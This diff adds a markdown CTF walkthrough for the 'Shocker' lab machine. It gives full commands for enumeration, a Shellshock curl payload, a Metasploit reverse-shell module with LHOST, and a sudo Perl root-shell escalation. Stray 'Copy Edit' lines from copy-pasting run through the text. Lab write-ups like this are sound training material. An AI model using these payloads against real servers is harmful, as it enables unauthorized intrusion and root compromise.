@@ -1,0 +1,124 @@
+# 💣 Shocker - CTF Walkthrough
+
+`Shocker` is a vulnerable machine focused on exploiting the infamous Shellshock vulnerability in CGI scripts running on a web server. The box also includes privilege escalation via a misconfigured `sudo` permission for Perl.
+
+---
+
+## 🛰️ Target Information
+
+- **IP Address:** `192.168.56.101` *(example)*
+- **Difficulty:** Easy
+- **OS:** Linux
+- **Goal:** Get the user and root flags
+
+---
+
+## 🕵️ Enumeration
+
+### 🔎 Port Scan (Nmap)
+
+nmap -sC -sV -Pn 192.168.56.101
+
+markdown
+Copy
+Edit
+
+**Open Ports:**
+
+- **22/tcp** – SSH
+- **80/tcp** – Apache HTTP Server
+
+### 🌐 Web Enumeration
+
+Accessing `http://192.168.56.101` shows a basic Apache test page.
+
+Run **DirBuster** or **Gobuster**:
+
+gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x cgi,sh,pl,py
+
+makefile
+Copy
+Edit
+
+**Found:**
+
+/cgi-bin/
+/cgi-bin/user.sh
+
+yaml
+Copy
+Edit
+
+---
+
+## ⚔️ Exploitation - Shellshock
+
+The `user.sh` CGI script is vulnerable to Shellshock (CVE-2014-6271).
+
+### 🧪 Manual Test
+
+```bash
+curl -A "() { :; }; echo; echo; /bin/bash -c 'id'" http://192.168.56.101/cgi-bin/user.sh
+🧨 Metasploit Exploit
+bash
+Copy
+Edit
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+
+set RHOST 192.168.56.101
+set TARGETURI /cgi-bin/user.sh
+set LHOST <Your_IP>
+run
+✅ Shell obtained as www-data
+
+🔐 Privilege Escalation
+Check sudo permissions:
+
+bash
+Copy
+Edit
+sudo -l
+Result:
+
+bash
+Copy
+Edit
+(root) NOPASSWD: /usr/bin/perl
+🚀 Root Shell via Perl
+bash
+Copy
+Edit
+sudo perl -e 'exec "/bin/bash";'
+whoami
+# root
+🏁 Flags
+🧑 User Flag
+bash
+Copy
+Edit
+cat /home/shelly/user.txt
+👑 Root Flag
+bash
+Copy
+Edit
+cat /root/root.txt
+🧠 Lessons Learned
+Always check /cgi-bin/ for CGI scripts and fuzz with extensions
+
+Shellshock is still a dangerous, real-world applicable exploit
+
+Misconfigured sudo rights (even for one binary) can lead to full system compromise
+
+👨‍💻 Author
+
+
+📜 Disclaimer
+This lab is intended for educational purposes only. Do not attempt these techniques on systems you do not own or have permission to test.
+
+yaml
+Copy
+Edit
+
+---
+
+
